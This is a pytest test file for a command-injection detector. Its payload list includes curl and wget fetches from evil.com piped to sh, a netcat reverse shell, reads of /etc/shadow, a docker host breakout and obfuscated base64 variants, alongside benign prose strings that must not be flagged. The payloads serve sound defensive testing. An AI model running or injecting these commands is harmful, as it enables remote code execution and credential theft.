import pytest

from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler

BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS = [
    pytest.param("`whoami`", id="bare_whoami"),
    pytest.param("`id`", id="bare_id"),
    pytest.param("`reboot`", id="bare_reboot"),
    pytest.param("`shutdown -h now`", id="bare_shutdown_flag"),
    pytest.param("`docker run --rm -it alpine sh`", id="bare_docker_run"),
    pytest.param("`docker exec -it victim sh`", id="bare_docker_exec"),
    pytest.param(
        "`docker run -v /:/host --rm alpine chroot /host sh`",
        id="bare_docker_host_breakout",
    ),
    pytest.param("`kubectl get secrets`", id="bare_kubectl_get_secrets"),
    pytest.param("`kubectl exec -it pod -- sh`", id="bare_kubectl_exec"),
    pytest.param("`openssl rand -hex 16`", id="bare_openssl_rand"),
    pytest.param("`openssl x509 -in /etc/ssl/key.pem`", id="bare_openssl_x509"),
    pytest.param('`eval "id"`', id="bare_eval_quoted_id"),
    pytest.param("`eval whoami`", id="bare_eval_whoami"),
    pytest.param("`exec /bin/sh`", id="bare_exec_bin_sh"),
    pytest.param("`exec whoami`", id="bare_exec_whoami"),
    pytest.param("`systemctl restart sshd`", id="bare_systemctl_restart"),
    pytest.param("`systemctl stop firewalld`", id="bare_systemctl_stop"),
    pytest.param("`curl http://evil.com/x.sh | sh`", id="bare_curl_pipe_sh"),
    pytest.param(
        "`curl -fsSL https://evil.sh | bash -`", id="bare_curl_fssl_pipe_bash"
    ),
    pytest.param("`wget -qO- http://evil.com/x | sh`", id="bare_wget_pipe_sh"),
    pytest.param("`curl -s http://evil.com/x.sh|sh`", id="bare_curl_pipe_sh_nospace"),
    pytest.param("; `whoami`", id="separator_semicolon_whoami"),
    pytest.param("| `id`", id="separator_pipe_id"),
    pytest.param("& `reboot`", id="separator_ampersand_reboot"),
    pytest.param(";`whoami`", id="separator_semicolon_whoami_nospace"),
    pytest.param("|`id`", id="separator_pipe_id_nospace"),
    pytest.param("&`reboot`", id="separator_ampersand_reboot_nospace"),
    pytest.param("&& `whoami`", id="separator_double_ampersand_whoami"),
    pytest.param("|| `id`", id="separator_double_pipe_id"),
    pytest.param("; `whoami`;", id="separator_wrapped_whoami"),
    pytest.param("`id`; `whoami`", id="chained_semicolon_id_whoami"),
    pytest.param("`id`|`whoami`", id="chained_pipe_id_whoami"),
    pytest.param("`id`&`whoami`", id="chained_ampersand_id_whoami"),
    pytest.param("`uname -a`", id="bare_uname_a"),
    pytest.param("`hostname`", id="bare_hostname"),
    pytest.param("`ifconfig`", id="bare_ifconfig"),
    pytest.param("`ipconfig /all`", id="bare_ipconfig_all"),
    pytest.param("`pwd`", id="bare_pwd"),
    pytest.param("`groups`", id="bare_groups"),
    pytest.param("`cat /etc/passwd`", id="bare_cat_etc_passwd"),
    pytest.param("`cat /etc/shadow`", id="bare_cat_etc_shadow"),
    pytest.param("`ls -la /`", id="bare_ls_la_root"),
    pytest.param("`nc -e /bin/sh 10.0.0.1 4444`", id="bare_nc_reverse_shell"),
    pytest.param("`ping -c 1 attacker.example`", id="bare_ping_exfil"),
    pytest.param("`python3 exploit.py`", id="bare_python3_exploit"),
    pytest.param(
        "`python3 -c 'import os;os.system(\"id\")'`", id="bare_python3_inline_exec"
    ),
    pytest.param("`perl -e 'system(\"id\")'`", id="bare_perl_inline_exec"),
    pytest.param("`ruby -e 'system(\"id\")'`", id="bare_ruby_inline_exec"),
    pytest.param(
        '`node -e \'require("child_process").exec("id")\'`',
        id="bare_node_inline_exec",
    ),
    pytest.param("`bash -c id`", id="bare_bash_c_id"),
    pytest.param("`sh -c id`", id="bare_sh_c_id"),
    pytest.param("`/bin/sh -c id`", id="bare_path_sh_c_id"),
    pytest.param("`./malicious.sh`", id="bare_relative_path_script"),
    pytest.param("`~/backdoor.sh`", id="bare_home_relative_script"),
    pytest.param("`/usr/bin/whoami`", id="bare_absolute_path_whoami"),
    pytest.param("`/bin/id`", id="bare_absolute_path_id"),
    pytest.param("`$(whoami)`", id="bare_nested_dollar_paren_whoami"),
    pytest.param("`$(id)`", id="bare_nested_dollar_paren_id"),
    pytest.param("`echo $(whoami)`", id="bare_echo_nested_dollar_paren"),
    pytest.param("`w\\ho\\ami`", id="obfuscated_backslash_split_whoami"),
    pytest.param('`who"am"i`', id="obfuscated_double_quote_split"),
    pytest.param("`wh'o'ami`", id="obfuscated_single_quote_split"),
    pytest.param("`echo \\`id\\``", id="obfuscated_escaped_nested_backtick"),
    pytest.param("`base64 -d <<< payload | sh`", id="bare_base64_heredoc_pipe_sh"),
    pytest.param(
        "`echo d2hvYW1p | base64 -d | sh`", id="obfuscated_base64_decode_pipe_sh"
    ),
    pytest.param(
        "`curl -s http://evil.com/x.sh > /tmp/x.sh; sh /tmp/x.sh`",
        id="bare_curl_download_then_exec",
    ),
    pytest.param("  `whoami`  ", id="bare_whoami_padded_whitespace"),
    pytest.param("`rm -rf /tmp/*`", id="bare_rm_rf_glob"),
    pytest.param("`chmod 777 /etc/passwd`", id="bare_chmod_777_passwd"),
    pytest.param("`mkfifo /tmp/f`", id="bare_mkfifo"),
    pytest.param("`env`", id="bare_env"),
    pytest.param("`printenv`", id="bare_printenv"),
    pytest.param("`ps aux`", id="bare_ps_aux"),
    pytest.param("`netstat -an`", id="bare_netstat_an"),
    pytest.param("`crontab -l`", id="bare_crontab_l"),
    pytest.param("`history`", id="bare_history"),
    pytest.param("`sudo -l`", id="bare_sudo_l"),
    pytest.param("`aws sts get-caller-identity`", id="bare_aws_sts"),
    pytest.param("`az account show`", id="bare_az_account_show"),
    pytest.param("`gcloud auth list`", id="bare_gcloud_auth_list"),
    pytest.param("`X=1 whoami`", id="obfuscated_env_var_prefix_whoami"),
]

BENIGN_STRINGS_NOT_FLAGGED = [
    pytest.param("Run `ls` to list files in the directory.", id="markdown_ls_mention"),
    pytest.param("The `cat` command concatenates files.", id="markdown_cat_mention"),
    pytest.param(
        "Try `curl -X GET` against the users endpoint.", id="markdown_curl_snippet"
    ),
    pytest.param("`whoami` prints the current user.", id="markdown_whoami_mention"),
    pytest.param(
        "I recommend running `id` first to check your uid.", id="markdown_id_mention"
    ),
    pytest.param(
        "Our `python` style guide is in the wiki.", id="markdown_python_mention"
    ),
    pytest.param("See `bash --version` for compatibility.", id="markdown_bash_flag"),
    pytest.param("`sh` scripts belong in /bin.", id="markdown_sh_sentence_initial"),
    pytest.param(
        "Documentation: use `wget` to download release artifacts.",
        id="markdown_wget_docs",
    ),
    pytest.param(
        'Support ticket: "After I run `rm` on the wrong folder..."',
        id="support_ticket_rm_prose",
    ),
    pytest.param(
        "The `echo` builtin writes its arguments to standard output.",
        id="prose_echo_explainer",
    ),
    pytest.param(
        "Use `printf '%s\\n' \"$var\"` instead of echo for portability.",
        id="prose_printf_example",
    ),
    pytest.param(
        "`chmod +x script.sh` makes the script executable.", id="markdown_chmod_mention"
    ),
    pytest.param("`mv old.txt new.txt` renames a file.", id="markdown_mv_mention"),
    pytest.param(
        "`cp -r src/ dst/` copies a directory recursively.", id="markdown_cp_mention"
    ),
    pytest.param(
        "The process was stopped with `kill -TERM`.", id="prose_kill_signal_mention"
    ),
    pytest.param(
        "`ping` the host to check connectivity before debugging further.",
        id="prose_ping_mention",
    ),
    pytest.param(
        "`dig example.com` returns the DNS records for a domain.",
        id="markdown_dig_mention",
    ),
    pytest.param(
        "We no longer support `telnet` in this environment.", id="prose_telnet_mention"
    ),
    pytest.param(
        "Encode the payload with `base64` before sending it over email.",
        id="prose_base64_mention",
    ),
    pytest.param(
        "`awk` and `sed` are classic Unix text-processing tools.",
        id="markdown_awk_sed_mention",
    ),
    pytest.param(
        "`find . -name '*.py'` lists every Python file in the tree.",
        id="markdown_find_mention",
    ),
    pytest.param(
        "`tar -xzf archive.tar.gz` extracts a gzip-compressed tarball.",
        id="markdown_tar_mention",
    ),
    pytest.param(
        "Check your `env` for the missing `PATH` entry.", id="prose_env_mention"
    ),
    pytest.param(
        "We're migrating our ops scripts from `powershell` to `bash`.",
        id="prose_powershell_mention",
    ),
    pytest.param(
        "`node --version` should print v18 or later.", id="markdown_node_mention"
    ),
    pytest.param(
        "This endpoint is implemented in `php`, not `ruby`.",
        id="prose_php_ruby_mention",
    ),
    pytest.param(
        "`nslookup` is the classic DNS lookup tool, `dig` is its modern replacement.",
        id="prose_nslookup_dig_mention",
    ),
    pytest.param(
        "The total is due: $(the total is due)", id="dollar_paren_non_command_word"
    ),
    pytest.param(
        "Set the amount with ${amount} in the template.", id="template_syntax_amount"
    ),
    pytest.param(
        "Use ${user.name} to interpolate the current user's name.",
        id="template_syntax_user_name",
    ),
    pytest.param(
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
        id="makefile_variable_references",
    ),
    pytest.param(
        "In your shell profile, $(VAR)-style expansion is POSIX and ${VAR} is the "
        "modern equivalent.",
        id="shell_docs_var_expansion",
    ),
    pytest.param(
        '```json\n{"message": "Run `ls -la` first", "code": "`id`"}\n```',
        id="json_fenced_with_backticks",
    ),
    pytest.param(
        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
        'archive"}',
        id="json_body_with_backticks",
    ),
    pytest.param(
        "LGTM, just rename `foo` to `bar` before merging.", id="code_review_rename"
    ),
    pytest.param(
        "nit: extract this into a `find`-and-replace across the module.",
        id="code_review_find_mention",
    ),
    pytest.param(
        "Can you `rm` the unused import in this diff?", id="code_review_rm_mention"
    ),
    pytest.param(
        "Please `mv` this helper into utils.py in your next commit.",
        id="code_review_mv_mention",
    ),
    pytest.param(
        "Consider using `cp` semantics here instead of moving the reference.",
        id="code_review_cp_mention",
    ),
    pytest.param(
        "The `env` command with no arguments lists every variable in scope.",
        id="shell_docs_env_explainer",
    ),
    pytest.param(
        "`kill -l` lists all available signal names.", id="shell_docs_kill_list"
    ),
    pytest.param(
        "A backtick pair like `sed` renders as inline code in Markdown.",
        id="markdown_meta_explainer",
    ),
    pytest.param(
        "Our CI step runs `tar` to package build artifacts before upload.",
        id="prose_ci_tar_mention",
    ),
    pytest.param(
        "`awk '{print $1}'` prints the first column of each line.",
        id="markdown_awk_field_example",
    ),
    pytest.param(
        "TODO: replace `getUserId()` with the new auth helper.",
        id="todo_replace_function",
    ),
    pytest.param(
        "TODO: swap $(id -u) for os.getuid() before merging.",
        id="todo_dollar_paren_mention",
    ),
    pytest.param(
        "fix: rename `parseInput()` to `parseRequest()`", id="commit_message_rename"
    ),
    pytest.param(
        "chore: bump `docker` base image to 3.12-slim", id="commit_message_docker_bump"
    ),
    pytest.param(
        "docs: clarify that `kubectl` requires a valid kubeconfig",
        id="commit_message_kubectl_docs",
    ),
    pytest.param(
        "The invoice total is `$1,204.50` due on receipt.", id="money_amount_invoice"
    ),
    pytest.param(
        "Price adjusted to `$99.99` after the discount.", id="money_amount_discount"
    ),
    pytest.param(
        "See the config file `settings.yml` for defaults.", id="filename_settings_yml"
    ),
    pytest.param(
        "Please review `README.md` before opening a PR.", id="filename_readme_prose"
    ),
    pytest.param(
        "The template uses `{{ user.name }}` for interpolation.",
        id="template_syntax_mustache",
    ),
    pytest.param(
        "Our Jinja template renders `{% if active %}` blocks conditionally.",
        id="template_syntax_jinja",
    ),
    pytest.param("`v2.1.0` is the current stable release tag.", id="version_tag_prose"),
    pytest.param("`main.py` is the entry point for the CLI.", id="filename_main_py"),
    pytest.param(
        "In bash, backticks like `command` are legacy syntax for command substitution.",
        id="shell_docs_backtick_explainer",
    ),
    pytest.param(
        "The manual explains that `` `cmd` `` and `$(cmd)` are equivalent in "
        "POSIX shells.",
        id="shell_docs_double_backtick_span",
    ),
    pytest.param(
        "A `.env` file typically defines `DATABASE_URL` and `SECRET_KEY`.",
        id="shell_docs_dotenv_vars",
    ),
    pytest.param(
        '`git commit -m "fix: handle null case"` records the change.',
        id="git_docs_commit_example",
    ),
    pytest.param(
        "Reviewer note: `whoami` here is just the variable name, not a call.",
        id="code_review_whoami_variable_name",
    ),
    pytest.param(
        "Class attribute `id` maps to the primary key column.",
        id="code_review_id_attribute",
    ),
    pytest.param(
        "The HTML `id` attribute must be unique per page.", id="docs_html_id_attribute"
    ),
    pytest.param(
        "Field `hostname` is required in the payload schema.",
        id="docs_hostname_field_schema",
    ),
    pytest.param(
        "`docker compose up -d` starts every service defined in `docker-compose.yml`.",
        id="shell_docs_docker_compose",
    ),
    pytest.param(
        "`kubectl apply -f deployment.yaml` rolls out the new manifest.",
        id="shell_docs_kubectl_apply",
    ),
    pytest.param(
        "Our runbook says `systemctl status nginx` to check the service state.",
        id="shell_docs_systemctl_status",
    ),
    pytest.param(
        "`openssl x509 -in cert.pem -noout -dates` shows certificate validity.",
        id="shell_docs_openssl_dates",
    ),
    pytest.param(
        "Use `curl -s https://example.com | jq .` to pretty-print JSON responses.",
        id="shell_docs_curl_jq_pipeline",
    ),
    pytest.param(
        "`eval` in Python is different from `eval` in Bash; be careful comparing them.",
        id="prose_eval_language_comparison",
    ),
    pytest.param(
        "`exec` in Python replaces the current process image, similar to shell `exec`.",
        id="prose_exec_language_comparison",
    ),
    pytest.param(
        "The onboarding doc says run `reboot` only after applying kernel patches.",
        id="shell_docs_reboot_after_patches",
    ),
    pytest.param(
        "&& is the logical AND operator in most C-like languages.",
        id="prose_double_ampersand_operator",
    ),
    pytest.param(
        "Use `a && b` to run `b` only if `a` succeeds.", id="markdown_and_operator"
    ),
    pytest.param(
        "The condition `x || y` short-circuits once `x` is truthy.",
        id="markdown_or_operator",
    ),
]


@pytest.mark.parametrize("payload", BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS)
def test_bare_backtick_command_substitution_is_detected(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


def test_bare_backtick_command_substitution_is_detected_via_query_param() -> None:
    result = sus_patterns_handler.detect(
        content="`whoami`", ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True


@pytest.mark.parametrize("text", BENIGN_STRINGS_NOT_FLAGGED)
def test_benign_text_not_flagged_as_command_injection(text: str) -> None:
    result = sus_patterns_handler.detect(
        content=text, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


def test_benign_text_not_flagged_via_query_param_context() -> None:
    result = sus_patterns_handler.detect(
        content="Run `ls` to list files in the directory.",
        ip_address="198.51.100.4",
        context="query_param",
    )
    assert result["is_threat"] is False


BACKTICK_WRAPPED_SUBSTITUTION_NOT_FLAGGED = [
    pytest.param("see the `$(id)` example", id="backtick_wrapped_dollar_paren_id"),
    pytest.param("run `$(whoami)` first", id="backtick_wrapped_dollar_paren_whoami"),
    pytest.param("use `${HOME}` in paths", id="backtick_wrapped_dollar_brace_home"),
    pytest.param(
        "the docs show `$(pwd)` as an example substitution",
        id="backtick_wrapped_dollar_paren_pwd",
    ),
    pytest.param(
        "reference `${PATH}` in your shell config",
        id="backtick_wrapped_dollar_brace_path",
    ),
]

SEPARATOR_PREFIXED_SUBSTITUTION_STILL_FLAGGED = [
    pytest.param("; $(id)", id="semicolon_dollar_paren_id"),
    pytest.param("| $(whoami)", id="pipe_dollar_paren_whoami"),
    pytest.param("& ${HOME}", id="ampersand_dollar_brace_home"),
    pytest.param(";$(cat /etc/passwd)", id="semicolon_dollar_paren_no_space"),
    pytest.param("|${IFS}cat${IFS}/etc/passwd", id="pipe_dollar_brace_ifs"),
]


@pytest.mark.parametrize("payload", BACKTICK_WRAPPED_SUBSTITUTION_NOT_FLAGGED)
def test_backtick_wrapped_substitution_not_flagged(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.parametrize("payload", SEPARATOR_PREFIXED_SUBSTITUTION_STILL_FLAGGED)
def test_separator_prefixed_substitution_still_flagged(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )
